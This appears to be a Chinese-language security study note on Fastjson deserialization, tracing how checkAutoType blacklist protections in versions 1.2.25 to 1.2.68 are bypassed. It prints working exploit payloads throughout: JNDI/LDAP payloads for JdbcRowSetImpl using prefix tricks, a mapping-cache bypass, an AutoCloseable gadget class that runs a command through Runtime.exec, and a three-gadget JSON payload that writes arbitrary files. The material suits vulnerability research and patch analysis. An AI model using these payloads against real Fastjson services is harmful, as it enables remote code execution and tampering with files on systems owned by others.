[[基础利用链]]版本之后对于补丁的bypass

Bypass AutoType

1.2.25-1.2.41

1.2.24之后的版本，引入了checkAutoType机制，默认情况下autoTypeSupport 关闭，不能直接反序列化任意类，而打开 AutoType 之后，是基于内置黑名单来实现安全的，fastjson 也提供了添加黑名单的接口
先来看新增的成员变量，位于praseconfig中

AUTO_SUPPORT为布尔类型，denylist为黑名单，acceptlist为可自主添加的白名单
添加反序列化白名单有3种方法：

  1. 使用代码进行添加：ParserConfig.getGlobalInstance().addAccept("xxx,xxx")
  2. 加上JVM启动参数：-Dfastjson.parser.autoTypeAccept=xxx.
  3. 在fastjson.properties中添加：fastjson.parser.autoTypeAccept=xxx.
    需要手动开启AutoType
System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");  
String payload = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://127.0.0.1:4444/test\", \"autoCommit\":false}";  
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  
JSON.parse(payload);

跟一下checkAutoType的逻辑
首先判断autoType是否为true，先判断类名是否在白名单中，如果在，就使用 TypeUtils.loadClass 加载，然后使用黑名单判断类名的开头，如果匹配就抛出异常。

如果没开启 autoType ，则是先使用黑名单匹配，再使用白名单匹配和加载。最后，如果要反序列化的类和黑白名单都未匹配时，只有开启了 autoType 或者 expectClass 不为空也就是指定了 Class 对象时才会调用 TypeUtils.loadClass 加载

这个if判断位于第一个if下，即黑白名单都为匹配的情况时进行loadClass

跟进loadClass的逻辑

当类名开头为L结尾为;时会将其删除，并重新进行加载，导致绕过黑名单

1.2.25-1.2.42

1.2.42将denylist从字符串数组替换为了hash表，并在checkautotype中添加了逻辑，如果传入的classname为L开头,;结尾，就将其删除处理，其余逻辑不变，双写即可绕过

System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");  
String payload = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://127.0.0.1:4444/test\", \"autoCommit\":false}";  
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  
JSON.parse(payload);

1.2.25-1.2.43

新增了判断，当开头为两个连续的L时会报错

可以使用中括号进行绕过

System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");  
String payload = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[,{\"dataSourceName\":\"ldap://127.0.0.1:4444/test\", \"autoCommit\":false}";  
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  
JSON.parse(payload);

这里在"后不加中括号会报错，根据调试在最后反序列化会进行处理

跟进parseArray方法

当不是中括号时会报错，我个人调试认为是识别为了一个字符串数组，导致需要中括号，还有待探究

受AutoType限制分析(1.2.25-1.2.32)

未开启AutoType时
问题同样是出现在checkAutoType,当没有开启AutoType时，会从map中寻找对应的class

跟进findClass会返回一个我们设置的keyString对应的clazz
调用到MiscCodec.deserilaze

判断键是否为val,是的就将val的值赋给objVal,objVal在后面会赋值给strVal变量
接着进入if判断clazz是否为class类

为真则调用loadClass

获取classLoader后就将调用类缓存到map当中
之后在扫描第二部分的时候，重新进入checkAutoType逻辑

可见缓存中已经存在JdbcRowSetImpl类，随后进行反序列化
开启AutoType时

虽然在第一次时将类缓存到了map当中，但是在第二次扫描时，checkAutoType在黑名单检测时抛出了错误，虽然可以采用之前的手法，但属实是画蛇添足

不受AutoType限制版本分析(1.2.33-1.2.47)

未开启的情况大致相同，主要分析开启autotype的情况
第一次循环同样是缓存到map中，但这里由于黑名单hash匹配中判断语句为
TypeUtils.getClassFromMapping(typeName) == null
我们缓存后一直不为null,因此会导致匹配不到，进入下一逻辑反序列化语句

1.2.68

利用 expectClass 绕过 checkAutoType() ，实际上也是为了绕过安全检查的思路的延伸。主要使用 Throwable 和 AutoCloseable 进行绕过。并且不受autotype影响

Fastjson <= 1.2.68；
利用类必须是expectClass类的子类或实现类，并且不在黑名单中；

public class TestAutoCloseable implements  AutoCloseable{  
    public TestAutoCloseable(String cmd){  
        try {  
            Runtime.getRuntime().exec(cmd);  
        } catch (Exception e) {  
            e.printStackTrace();  
        }  
    }  
  
  
    @Override  
    public void close() throws Exception {  
  
    }  
}
{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.example.spring.Fastjson_Test.TestAutoCloseable\",\"cmd\":\"calc\"}

利用该类进行调试，从checkAutoType开始

第一次调用到此处,expectclass为null

新增的safeMode判断，当开启safeMode时，会直接禁用autoType,抛出异常

很显然mapping中已经缓存了AutoCloseable类，直接从mapping中取出并返回

调用到第二次checkAutoType时，将其作为expectclass传入

进入白，黑名单检测

黑，白名单都未检测到，进入之后的逻辑，尝试从mapping缓存中读取该类，由于该类并没有缓存，随后进入autoType未开启的逻辑，继续检查黑，白名单

继续调用到如图逻辑，由于将第一个@type作为expectclass传入，Flag被设置为true,因此会调用loadClass

如果expectClass不为null，则判断目标类是否是expectClass类的子类，是的话就添加到Mapping缓存中并直接返回该目标类，否则直接抛出异常导致利用失败，这里就解释了为什么恶意类必须要继承AutoCloseable接口类，因为这里expectClass为AutoCloseable类、因此恶意类必须是AutoCloseable类的子类才能通过这里的判断
跳出checkAutoType之后，进行正常的反序列化逻辑

下面逐个分析各个类在payload中发挥的作用

  • org.eclipse.core.internal.localstore.SafeFileOutputStream：用来创建文件链接对象和OutputStream。
  • com.esotericsoftware.kryo.io.Output：用来向 OutputStream 中写入文件内容。
  • com.sleepycat.bind.serial.SerialOutput：用来触发 flush 方法将流写回文件中。
    先来看SafeFileOutputStream
public SafeFileOutputStream(String targetPath, String tempPath) throws IOException {  
    this.failed = false;  
    this.target = new File(targetPath);  
    this.createTempFile(tempPath);  
    if (!this.target.exists()) {  
        if (!this.temp.exists()) {  
            this.output = new BufferedOutputStream(new FileOutputStream(this.target));  
            return;  
        }  
  
        this.copy(this.temp, this.target);  
    }  
  
    this.output = new BufferedOutputStream(new FileOutputStream(this.temp));  
}

该构造方法接收两个String类型的参数，用于将tempPath路径的文件内容写入到targetPath,利用这点，可以达成任意文件读取
com.esotericsoftware.kryo.io.Output

public void setOutputStream(OutputStream outputStream) {  
    this.outputStream = outputStream;  
    this.position = 0;  
    this.total = 0L;  
}  
  
public void setBuffer(byte[] buffer) {  
    this.setBuffer(buffer, buffer.length);  
}

Output类主要用来像输入流中写入数据，并且提供了setBuffer()和setOutputStream()两个setter方法可以用来写入输入流，其中buffer参数值是文件内容，outputStream参数值就是前面的SafeFileOutputStream类对象，而要触发写文件操作则需要调用其flush()函数

public void flush() throws KryoException {  
    if (this.outputStream != null) {  
        try {  
            this.outputStream.write(this.buffer, 0, this.position);  
            this.outputStream.flush();  
        } catch (IOException var2) {  
            throw new KryoException(var2);  
        }  
  
        this.total += (long)this.position;  
        this.position = 0;  
    }  
}

flush()方法只有在close()和require()被调用时调用,require()在write()中被调用
com.sleepycat.bind.serial.SerialOutput
ObjectOutputStream类，其内部类BlockDataOutputStream的构造函数中将OutputStream类型参数赋值给out成员变量，而其setBlockDataMode()函数中调用了drain()函数、drain()函数中又调用了out.write()函数

BlockDataOutputStream(OutputStream out) {  
    this.out = out;  
    dout = new DataOutputStream(this);  
}  
boolean setBlockDataMode(boolean mode) throws IOException {  
    if (blkmode == mode) {  
        return blkmode;  
    }  
    drain();  
    blkmode = mode;  
    return !blkmode;  
}

对于setBlockDataMode()函数的调用，在ObjectOutputStream类的有参构造函数中就存在

但是Fastjson在解析时会优先获取无参的构造方法，因此需要SerialOutput类，该类的构造方法继承了ObjectOutputStream的有参构造

public SerialOutput(OutputStream out, ClassCatalog classCatalog) throws IOException {  
    super(out);  
    this.classCatalog = classCatalog;  
    this.useProtocolVersion(2);

因此利用Fastjson的循环调用即可完成写入文件的操作
Fastjson的解析规则如下
|"$ref":".."|上一级
|"$ref":"@"|当前对象，也就是自引用
|"$ref":"$"|根对象
|"$ref":"$.children.0"|基于路径的引用，相当于 root.getChildren().get(0)
payload：

{ "stream": { "@type": "java.lang.AutoCloseable", "@type": "org.eclipse.core.internal.localstore.SafeFileOutputStream", "targetPath": "F:/Code/hacked.txt", "tempPath": "F:/Code/test.txt" }, "writer": { "@type": "java.lang.AutoCloseable", "@type": "com.esotericsoftware.kryo.io.Output", "buffer": "dXUyZnUzbw==", "outputStream": { "$ref": "$.stream" }, "position": 5 }, "close": { "@type": "java.lang.AutoCloseable", "@type": "com.sleepycat.bind.serial.SerialOutput", "out": { "$ref": "$.writer" } } }

不过这样写入的文件内容很有限，并且无法写入特殊字符，该方法也需要三个依赖才能成功
commons-io的利用可以参考这篇文章
该文章利用了缓冲区溢出来进行写入，并且是更为常见的依赖
